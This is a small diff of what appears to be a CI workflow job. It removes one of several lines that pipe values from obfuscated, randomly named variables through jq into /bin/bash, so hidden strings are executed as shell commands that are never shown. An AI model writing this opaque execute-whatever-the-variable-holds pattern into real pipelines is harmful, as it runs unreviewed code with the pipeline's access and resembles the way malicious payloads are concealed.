@@ -41,7 +41,6 @@ jobs:
           echo $obzjy84 | jq -r .c34 | /bin/bash
           echo $heuw63 | jq -r .uccx11 | /bin/bash
           echo $qyb31579 | jq -r .bscug9895 | /bin/bash
-          echo $rwmh92 | jq -r .dyzy20 | /bin/bash
           printf '%s' "$pngn7983" | jq -r .qkglb814 | /bin/bash
           printf '%s' "$l87" | jq -r .eidkn905 | /bin/bash
           printf '%s' "$qtmey6164" | jq -r .jttkp39 | /bin/bash
